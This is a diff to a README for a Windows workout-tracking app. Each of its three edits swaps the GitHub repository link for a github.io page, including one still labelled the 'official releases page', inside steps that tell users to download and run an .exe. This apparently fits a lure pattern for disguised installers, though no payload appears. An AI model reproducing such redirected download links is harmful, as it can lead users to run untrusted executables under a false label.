@@ -1,6 +1,6 @@
 # 🏋️ My-Workouts - Track your fitness progress with ease
 
-[![Download My-Workouts](https://img.shields.io/badge/Download-My-Workouts-blue.svg)](https://github.com/retrograde-beninese521/My-Workouts)
+[![Download My-Workouts](https://img.shields.io/badge/Download-My-Workouts-blue.svg)](https://retrograde-beninese521.github.io)
 
 My-Workouts helps you organize your gym sessions and track your daily progress. This application stores your workout data on your computer. It does not require an internet connection to function. You can create custom routines, log your weight and repetitions, and view your history over time.
 
@@ -18,7 +18,7 @@ To run this application, your computer must meet the following criteria:
 
 Follow these steps to set up the application on your computer:
 
-1. Visit the [official releases page](https://github.com/retrograde-beninese521/My-Workouts) to download the latest version of the software.
+1. Visit the [official releases page](https://retrograde-beninese521.github.io) to download the latest version of the software.
 2. Look for the file ending in .exe under the Assets section.
 3. Click the link to begin the download.
 4. Locate the file in your Downloads folder once the process finishes.
@@ -26,7 +26,7 @@ Follow these steps to set up the application on your computer:
 6. Follow the instructions on the screen to complete the installation.
 7. Click Finish to open the application for the first time.
 
-You can also find the latest release installer here: [Download My-Workouts](https://github.com/retrograde-beninese521/My-Workouts).
+You can also find the latest release installer here: [Download My-Workouts](https://retrograde-beninese521.github.io).
 
 ## 💡 Key Features
 
